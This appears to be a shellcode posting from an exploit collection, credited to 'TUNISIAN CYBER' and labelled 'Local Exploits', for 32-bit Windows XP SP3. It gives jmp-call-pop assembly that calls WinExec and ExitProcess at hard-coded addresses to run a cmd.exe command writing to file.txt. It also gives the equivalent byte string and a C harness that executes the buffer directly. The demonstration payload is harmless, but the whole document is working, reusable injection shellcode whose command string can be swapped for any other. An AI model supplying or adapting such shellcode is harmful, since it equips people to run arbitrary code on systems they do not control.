/*
#[+] Author: TUNISIAN CYBER
#[+] Title: Shellcode: win32/xp sp3 Create ("file.txt") (83 bytes)
#[+] Date: 15-04-2015
#[+] Type: Local Exploits
#[+] Tested on: WinXp 32bit SP3
#[+] Friendly Sites: sec4ever.com
#[+] Twitter: @TCYB3R
#[+] Credits: steve hanna
              projectshellcode.com
=============================
Assembly:

;create.asm
[Section .text]

BITS 32

global _start

_start:

jmp short GetCommand
CommandReturn:
    pop ebx

    xor eax,eax
    push eax
    push ebx
    mov ebx,0x7c8623ad
    call ebx

    xor eax,eax
    push eax
    mov ebx, 0x7c81cafa
    call ebx

GetCommand:
    call CommandReturn
    db "cmd.exe /C echo shellcode by tunisian cyber >file.txt"
    db 0x00
=============================
*/
char shellcode[] =  "\xeb\x16\x5b\x31\xc0\x50\x53\xbb\xad\x23\x86\x7c\xff"
                    "\xd3\x31\xc0\x50\xbb\xfa\xca\x81\x7c\xff\xd3\xe8\xe5\xff\xff\xff\x63\x6d\x64\x2e\x65\x78"
                    "\x65\x20\x2f\x43\x20\x65\x63\x68\x6f\x20\x73\x68\x65\x6c\x6c\x63\x6f\x64\x65\x20\x62\x79"
                    "\x20\x74\x75\x6e\x69\x73\x69\x61\x6e\x20\x63\x79\x62\x65\x72\x20\x3e\x66\x69\x6c\x65\x2e\x74\x78\x74\x00";


int main(int argc, char **argv){int (*f)();f = (int (*)())shellcode;(int)(*f)();}